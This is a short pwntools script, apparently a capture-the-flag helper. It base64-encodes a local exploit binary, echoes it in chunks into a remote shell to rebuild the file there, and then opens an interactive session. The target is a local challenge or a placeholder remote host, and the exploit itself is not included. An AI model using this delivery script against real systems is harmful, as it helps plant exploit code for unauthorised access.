from pwn import *
import sys
import os
#Cre: vilex1337

EXPLOIT_PATH = './exp'
FILE_PATH = './fs/exp'
add = ''
port = 1337
SHELL_PROMPT = '$ '
def get_splitted_encoded_exploit():
    split_every = 800
    with open('./exp', 'rb') as exploit_file:
        exploit = base64.b64encode(exploit_file.read())
    return [exploit[i:i+split_every] for i in range(0, len(exploit), split_every)]


def upload_exploit(sh):
    chunks_sent = 0
    splitted_exploit = get_splitted_encoded_exploit()
    for exploit_chunk in splitted_exploit:
        print(f'[*] Sending a chunk ({chunks_sent}/{len(splitted_exploit)})')
        sh.sendlineafter(SHELL_PROMPT, f'echo {exploit_chunk.decode()} | base64 -d >> {EXPLOIT_PATH}')
        chunks_sent += 1

context.log_level ='debug'
global r
if(len(sys.argv) == 1):
    os.system("./run.sh compile")
    r = remote("localhost", 1234)
else:
    r = remote(add, port)

upload_exploit(r)
r.interactive()